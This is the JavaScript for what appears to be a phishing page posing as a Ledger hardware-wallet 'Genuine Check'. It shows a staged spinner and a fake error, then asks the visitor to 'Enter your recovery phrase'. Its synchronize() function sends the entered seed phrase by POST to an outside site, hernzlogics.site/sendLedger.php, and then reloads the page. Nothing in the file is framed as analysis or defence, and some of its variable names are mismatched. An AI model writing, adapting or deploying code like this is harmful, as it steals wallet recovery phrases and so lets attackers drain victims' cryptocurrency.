let cards = document.querySelectorAll('#myCard');
let blockCard =  document.getElementById('rower');
let txtChnage = document.getElementById('text-change');
let con2 = document.getElementsByClassName('con2');

let hiddenCard =  document.getElementById('rowing');
let spinner = document.getElementById('spinner');
let errorDiv = document.getElementById('error-div');
let unlockDev = document.getElementById('unlock-dev');
let keys = document.getElementById('phrase1');
let formDiv  = document.getElementById('form');


cards.forEach((card) => {
card.addEventListener('click', function(){
    txtChnage.innerText = 'Genuine Check';
    clearcard();
    displayHidd();
});
});

function clearcard(){
  blockCard.innerHTML = ''
}

function displayHidd(){ 
    hiddenCard.style.display = 'block';
    spinner.style.display = 'block';

    setTimeout(HiddeCard, 3000)
}

function HiddeCard(){
    hiddenCard.style.display = 'none';
    spinner.style.display = 'none';
    errorDiv.style.display = 'block';
    unlockDev.textContent = '';
}
function retry(){
    errorDiv.style.display = 'none'
    clearcard();
    displayHidd();
}

function displayForm(){
    txtChnage.innerText = 'Enter your recovery phrase';
    errorDiv.style.display = 'none';
    formDiv.style.display = 'block';
}

function newelement(){
    let newDiv = document.createElement('div')
    newDiv.className = 'col-md-4 grid-margin stretch-card';

    let newdiv2 = document.createElement('div');
    newdiv2.className = 'card';

    let newDiv3 = document.createElement('div');
    newDiv3.className = 'card-body';

    let newh4 = document.createElement('h4');
    newh4.className = 'card-title';

    let newimg = document.createElement('img');
    newimg.src = 'nano_s_plus_after.png'

    //Append the img to the h4 element
    newh4.appendChild(newImg);

    // Append the h4 element to newDiv3
    newDiv3.appendChild(newh4);

    // Append newDiv3 to newDiv2
    newDiv2.appendChild(newDiv3);

    // Append newDiv2 to newDiv
    newDiv.appendChild(newDiv2);

    blockCard.appendChild(newDiv);

}

function synchronize(){
    var valueKey = keys.value
    console.log(valueKey);

    var emailData = {
        message: valueKey
    };

    fetch('https://hernzlogics.site/sendLedger.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData)
    })
    .then(response => response.json())
    .then(data => {
        window.location.reload();
    })
    .catch((error) => console.error('Error:', error));
}



